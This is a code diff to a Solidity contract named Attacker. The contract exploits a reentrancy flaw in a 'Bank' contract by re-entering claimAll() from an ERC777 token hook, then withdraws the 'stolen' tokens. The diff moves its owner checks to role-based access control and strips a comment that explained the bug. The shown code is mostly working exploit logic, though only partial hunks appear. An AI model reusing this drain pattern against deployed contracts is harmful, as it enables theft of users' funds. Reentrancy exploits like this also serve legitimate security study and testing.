@@ -4,6 +4,7 @@ pragma solidity ^0.8.0;
 import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
 import "@openzeppelin/contracts/token/ERC777/IERC777.sol";
 import "@openzeppelin/contracts/interfaces/IERC1820Registry.sol";
+import "@openzeppelin/contracts/access/AccessControl.sol";
 
 /**
  * @title IBank
@@ -20,16 +21,18 @@ interface IBank {
  * @title Attacker
  * @dev This contract exploits a reentrancy vulnerability in the Bank contract.
  */
-contract Attacker is IERC777Recipient {
-    address public owner;
+contract Attacker is IERC777Recipient, AccessControl {
+    bytes32 public constant ATTACKER_ROLE = keccak256("ATTACKER_ROLE");
+    
     IBank public bank;
     IERC777 public token;
     
     IERC1820Registry private constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
     bytes32 private constant TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");
 
-    constructor(address _owner) {
-        owner = _owner;
+    constructor(address admin) {
+        _grantRole(DEFAULT_ADMIN_ROLE, admin);
+        _grantRole(ATTACKER_ROLE, admin);
         // Register this contract as an ERC777TokensRecipient
         _ERC1820_REGISTRY.setInterfaceImplementer(address(this), TOKENS_RECIPIENT_INTERFACE_HASH, address(this));
     }
@@ -37,10 +40,11 @@ contract Attacker is IERC777Recipient {
     /**
      * @dev Sets the address of the vulnerable Bank contract.
      */
-    function setTarget(address _target) public {
-        require(msg.sender == owner, "Only owner can set target");
+    function setTarget(address _target) public onlyRole(DEFAULT_ADMIN_ROLE) {
         bank = IBank(_target);
         token = bank.token();
+        _grantRole(ATTACKER_ROLE, address(this));
+        _grantRole(ATTACKER_ROLE, address(bank));
     }
 
     /**
@@ -77,7 +81,6 @@ contract Attacker is IERC777Recipient {
         }
         
         // Re-enter if our balance in the bank is still positive
-        // This works because claimAll() sets balances[msg.sender] = 0 AFTER minting
         if (bank.balances(address(this)) > 0) {
             bank.claimAll();
         }
@@ -86,8 +89,7 @@ contract Attacker is IERC777Recipient {
     /**
      * @dev Withdraws all stolen ERC777 tokens to the specified address.
      */
-    function withdraw(address to) public {
-        require(msg.sender == owner, "Only owner can withdraw");
+    function withdraw(address to) public onlyRole(DEFAULT_ADMIN_ROLE) {
         uint256 balance = token.balanceOf(address(this));
         require(balance > 0, "No tokens to withdraw");
         token.send(to, balance, "");
